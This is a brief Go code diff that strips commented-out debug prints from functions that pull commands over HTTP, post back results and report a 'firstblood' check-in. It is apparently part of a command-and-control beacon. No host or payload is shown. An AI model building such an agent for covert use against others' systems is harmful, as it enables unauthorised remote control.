@@ -189,7 +189,6 @@ func FirstBlood() bool {
 		fmt.Println("firstblood: ok")
 		break
 	}
-	//command.Sleep()
 	return true
 }
 
@@ -199,12 +198,10 @@ func PullCommand() ([]byte, error) {
 		fmt.Printf("pull command fail: %s\b", err)
 		return nil, err
 	}
-	//fmt.Printf("pullcommand: %s\n", string(resp))
 	return resp, nil
 }
 
 func PushResult(b []byte) *req.Resp {
 	resp := HttpPost(b)
-	//fmt.Printf("pushresult: %v\n", resp.Request().URL)
 	return resp
 }
